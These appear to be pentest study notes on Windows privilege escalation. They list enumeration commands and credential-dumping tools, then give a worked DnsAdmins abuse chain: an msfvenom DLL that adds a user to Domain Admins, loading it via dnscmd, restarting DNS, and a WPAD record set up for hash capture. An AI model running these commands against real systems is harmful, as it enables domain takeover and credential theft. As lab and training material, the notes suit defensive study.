---
layout: default
---
# Windows Priv Escalation

## Tools

[Seatbelt](https://github.com/GhostPack/Seatbelt) → C# project for performing a wide variety of local privilege escalation checks

[Pre-Compiled Binary](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)

[winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) → WinPEAS is a script that searches for possible paths to escalate privileges on Windows hosts. All of the checks are explained 

[PowerUp](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1) → PowerShell script for finding common Windows privilege escalation vectors that rely on misconfigurations. It can also be used to exploit some of the issues found

[SharpUp](https://github.com/GhostPack/SharpUp) →  C# version of PowerUp

[Pre-Compiled Binary](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)

[JAWS](https://github.com/411Hall/JAWS) →  PowerShell script for enumerating privilege escalation vectors written in PowerShell 2.0

[SessionGopher](https://github.com/Arvanaghi/SessionGopher) → SessionGopher is a PowerShell tool that finds and decrypts saved session information for remote access tools. It extracts PuTTY, WinSCP, SuperPuTTY, FileZilla, and RDP saved session information

[Watson](https://github.com/rasta-mouse/Watson) → Watson is a .NET tool designed to enumerate missing KBs and suggest exploits for Privilege Escalation vulnerabilities.

[LaZagne](https://github.com/AlessandroZ/LaZagne) → Tool used for retrieving passwords stored on a local machine from web browsers, chat tools, databases, Git, email, memory dumps, PHP, sysadmin tools, wireless network configurations, internal Windows password storage mechanisms, and more

[Windows Exploit Suggester - Next Generation](https://github.com/bitsadmin/wesng) → WES-NG is a tool based on the output of Windows' systeminfo utility which provides the list of vulnerabilities the OS is vulnerable to, including any exploits for these vulnerabilities. Every Windows OS between Windows XP and Windows 10, including their Windows Server counterparts, is supported

Sysinternals Suite → We will use several tools from Sysinternals in our enumeration including [AccessChk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk), [PipeList](https://docs.microsoft.com/en-us/sysinternals/downloads/pipelist), and [PsService](https://docs.microsoft.com/en-us/sysinternals/downloads/psservice)


> Note: Depending on how we gain access to a system we may not have many directories that are writeable by our user to upload tools. It is always a safe bet to upload tools to C:\Windows\Temp because the BUILTIN\Users group has write access.

## Getting lay of the Land

### Situational Awareness

#### Network Information

Interface(s), IP Address(es), DNS Information

```
C:\Users\> ipconfig /all
```
ARP Table

```
C:\Users\> arp -a
```
Routing Table

```
C:\Users\> route print
```
#### Enumerating Protections

Check Windows Defender Status

```
PS C:\Users\> Get-MpComputerStatus
```
List AppLocker Rules

```
PS C:\Users\> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

Test AppLocker Policy

```
PS C:\Users\> Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone
```

### Initial Enumeration

[Windows COmmand Reference](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/windows-commands)

[Cheat Sheet](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/#windows-version-and-configuration)

#### Key Data Points

* OS name: Knowing the type of Windows OS (workstation or server) and level (Windows 7 or 10, Server 2008, 2012, 2016, 2019, etc.) will give us an idea of the types of tools that may be available (such as the PowerShell version, or lack thereof on legacy systems. This would also identify the operating system version for which there may be public exploits availabl

* Version: As with the OS version, there may be public exploits that target a vulnerability in a specific version of Windows. Windows system exploits can cause system instability or even a complete crash. Be careful running these against any production system, and make sure you fully understand the exploit and possible ramifications before running one.

* Running Services: Knowing what services are running on the host is important, especially those running as NT AUTHORITY\SYSTEM or an administrator-level account. A misconfigurng in the context of a privileged account can be an easy win for privilege escalation

#### System Information

```
C:\Users\> tasklist /svc
```
**standard Windows processes**: Session Manager Subsystem (smss.exe), Client Server Runtime Subsystem (csrss.exe), WinLogon (winlogon.exe), Local Security Authority Subsystem Service (LSASS), and Service Host (svchost.exe)

#### Display All Environment Variables

```
C:\Users\> set
```
> when running a program, Windows looks for that program in the CWD (Current Working Directory) first, then from the PATH going left to right

> If a file is placed in USERPROFILE\AppData\Microsoft\Windows\Start Menu\Programs\Startup, when the user logs into a different machine, this file will execute

#### View Detailed Configuration Information

```
C:\Users\> systeminfo
```

> The System Boot Time and OS Version can also be checked to get an idea of the patch level

#### Patches and Updates

```
C:\Users\> wmic qfe
```

```
PS C:\> Get-HotFix | ft -AutoSize
```
> If systeminfo doesn't display hotfixes, they may be queriable with WMI using the WMI-Command binary with QFE (Quick Fix Engineering) to display patches

#### Installed Programs

```
C:\Users\> wmic product get name
```

```
PS C:\> Get-WmiObject -Class Win32_Product |  select Name, Version
```

#### Display Running Processes

```
PS C:\> netstat -ano

PS C:\> netstat -anoy
```
```
PS C:\Windows\system32> Get-Process -Id (Get-NetTCPConnection -LocalPort portnumber).OwningProcess             
```
> Service Listening On specific port
> Elevated Session may Required

#### User & Group Information

```
PS C:\Users\> query user
```
> Logged-In Users

```
C:\Users\ > echo %USERNAME%
```
> Current User

```
C:\> whoami /priv
```
> Current User Privileges

```
PS C:\Users\> whoami /groups
```
> Current User Group Information

```
PS C:\Users\> net user
```
> Get All Users

```
PS C:\Users\> net localgroup
```
> Get All Groups

```
PS C:\Users\> net localgroup administrators
```
> Details About a Group

```
PS C:\Users\> net accounts
```
> Get Password Policy

### Communication WIth Processes

#### Listing Named Pipes with Pipelist

```
C:\> pipelist.exe /accepteula
```

> Listing Named Pipes with PowerShell

```
PS C:\>  gci  \\.\pipe\
```

> Reviewing LSASS Named Pipe Permissions

```
C:\> accesschk.exe /accepteula \\.\Pipe\lsass -v
```

#### Named Pipes Attack Example

```
C:\> accesschk.exe -w \pipe\* -v
```
 
> WindscribeService named pipe allows READ and WRITE access to the Everyone group, meaning all authenticated users.

```
C:\> accesschk.exe -accepteula -w \pipe\WindscribeService -v
```

## Windows Group Privileges

### Event Log Readers

Administrators or members of the Event Log Readers group have permission to access this log

```
C:\> net localgroup "Event Log Readers"
```
Reference Guide to all Built-IN Windows commands [here](https://download.microsoft.com/download/5/8/9/58911986-D4AD-4695-BF63-F734CD4DF8F2/ws-commands.pdf)

We can query Windows events from the command line using the [wevtutil](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil) utility and the [Get-WinEvent](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.diagnostics/get-winevent?view=powershell-7.1)  PowerShell cmdlet.

#### Searching Security Logs Using wevtutil

```
PS C:\> wevtutil qe Security /rd:true /f:text | Select-String "/user"
```
#### Passing Credentials to wevtutil

```
C:\> wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"
 ```

####  Searching Security Logs Using Get-WinEvent

```
PS C:\> Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
```

> Searching the Security event log with Get-WinEvent requires administrator access or permissions adjusted on the registry key HKLM\System\CurrentControlSet\Services\Eventlog\Security. Membership in just the Event Log Readers group is not sufficient.

### DNS ADMINS

Members of the DnsAdmins group have access to DNS information on the network. The Windows DNS service supports custom plugins and can call functions from them to resolve name queries that are not in the scope of any locally hosted DNS zones. The DNS service runs as NT AUTHORITY\SYSTEM, so membership in this group could potentially be leveraged to escalate privileges on a Domain Controller or in a situation where a separate server is acting as the DNS server for the domain. It is possible to use the built-in [dnscmd](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd) utility to specify the path of the plugin DLL



*  DNS management is performed over RPC
  
*  ServerLevelPluginDll allows us to load a custom DLL with zero verification of the DLL's path. This can be done with the dnscmd tool from the command line
    
*  When a member of the DnsAdmins group runs the dnscmd command below, the HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll registry key is populated
    
*  When the DNS service is restarted, the DLL in this path will be loaded (i.e., a network share that the Domain Controller's machine account can access)
    
*  An attacker can load a custom DLL to obtain a reverse shell or even load a tool such as Mimikatz as a DLL to dump credentials.

#### Leveraging DnsAdmins Access

##### Generating Malicious DLL

malicious DLL to add a user to the domain admins group using msfvenom

```
attacker@linux: msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
```

##### Loading DLL as Non-Privileged User

Moving File to the victim machine then using the dnscmd utility to load a custom DLL with a non-privileged user

```
C:\> dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
DNS Server failed to reset registry property.
    Status = 5 (0x00000005)
Command failed: ERROR_ACCESS_DENIED
```
> As expected, attempting to execute this command as a normal user isn't successful. Only members of the DnsAdmins group are permitted to do this.

##### Loading DLL as Member of DnsAdmins

```
C:\> Get-ADGroupMember -Identity DnsAdmins

distinguishedName : CN=netadm,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
name              : netadm
objectClass       : user
objectGUID        : 1a1ac159-f364-4805-a4bb-7153051a8c14
SamAccountName    : netadm
SID               : S-1-5-21-669053619-2741956077-1013132368-1109  
```

##### Loading Custom DLL

```
C:\> dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll

Registry property serverlevelplugindll successfully reset.
Command completed successfully.
```
> We must specify the full path to our custom DLL or the attack will not work properly

Only the dnscmd utility can be used by members of the DnsAdmins group, as they do not directly have permission on the registry key.
Membership in the DnsAdmins group doesn't give the ability to restart the DNS service, the DLL will be loaded the next time the DNS service is started

#### Finding User's SID
If we do not have access to restart the DNS server, we will have to wait until the server or service restarts. Let's check our current user's permissions on the DNS service.
 
```
C:\> wmic useraccount where name="netadm" get sid
```
 
##### Checking Permissions on DNS Service
 
```
C:\> sc.exe sdshow DNS
```
 
> [this](https://www.winhelponline.com/blog/view-edit-service-permissions-windows/) article can be used to read SDDL syntax
 
#### Stop and Start the DNS Service
 
If our user has **RPWP** permissions which translate to **SERVICE_START** and **SERVICE_STOP**  we can issue the following commands to stop and start the service
 
```
C:\> sc stop dns
```
 
```
C:\> sc start dns
```
 
##### Confirming Group Membership
 
If all goes to plan, our account will be added to the Domain Admins group or receive a reverse shell if our custom DLL was made to give us a connection back
 
```
C:\> net group "Domain Admins" /dom 
```
 
#### Cleaning Up
 
**Making configuration changes and stopping/restarting the DNS service on a Domain Controller are very destructive actions and must be exercised with great care**

> These steps must be taken from an elevated console with a local or domain admin account.

#### Confirming Registry Key Added

The first step is confirming that the ServerLevelPluginDll registry key exists. Until our custom DLL is removed, we will not be able to start the DNS service again correctly

```
C:\> reg query \\<ip>\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
```
##### Deleting Registry Key

C:\> reg delete \\<ip>\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters  /v ServerLevelPluginDll
 
##### Starting the DNS Service Again and Checking status
 
```
C:\> sc.exe start dns
 
C:\> sc query dns
```
 
#### Creating a WPAD Record
 
Another way to abuse DnsAdmins group privileges is by creating a WPAD record. Membership in this group gives us the rights to disable global query block security, which by default blocks this attack
After disabling the global query block list and creating a WPAD record, every machine running WPAD with default settings will have its traffic proxied through our attack machine.
We could use a tool such as Responder or Inveigh to perform traffic spoofing, and attempt to capture password hashes and crack them offline or perform an SMBRelay attack
 
 
##### Disabling the Global Query Block List
 
```
C:\> Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.AD.local
```

##### Adding a WPAD Record

````
C:\htb> Add-DnsServerResourceRecordA -Name wpad -ZoneName AD.local -ComputerName dc01.AD.local -IPv4Address 10.10.14.3
``` 

